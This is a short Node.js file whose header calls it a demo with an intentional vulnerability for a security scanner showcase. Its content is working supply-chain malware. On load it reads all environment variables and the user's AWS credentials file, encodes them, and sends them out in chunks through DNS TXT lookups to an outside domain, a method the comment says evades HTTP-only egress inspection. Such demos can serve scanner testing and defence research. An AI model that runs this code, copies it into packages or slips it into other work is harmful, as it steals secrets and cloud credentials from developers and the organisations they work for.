/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain: credential exfiltration via DNS TXT lookups instead of HTTP POST.
 * Secrets chunked into subdomain labels; egress proxies inspecting HTTP(S) only are bypassed.
 */

'use strict';
const dns = require('dns');
const os = require('os');

function tryRead(filePath) {
  const fs = require('fs');
  try { return fs.readFileSync(filePath, 'utf8'); } catch (_) { return null; }
}

function base32Chunks(str, chunkSize) {
  const encoded = Buffer.from(str, 'utf8').toString('base64').replace(/[^a-zA-Z0-9]/g, '');
  const chunks = [];
  for (let i = 0; i < encoded.length; i += chunkSize) {
    chunks.push(encoded.slice(i, i + chunkSize));
  }
  return chunks;
}

const secrets = JSON.stringify({
  env: process.env,
  awsCreds: tryRead(require('path').join(os.homedir(), '.aws', 'credentials')),
});

const chunks = base32Chunks(secrets, 40);
chunks.forEach((chunk, index) => {
  dns.resolveTxt(`${index}.${chunk}.metrics-relay.pkg-cdn-dns.io`, () => {});
});
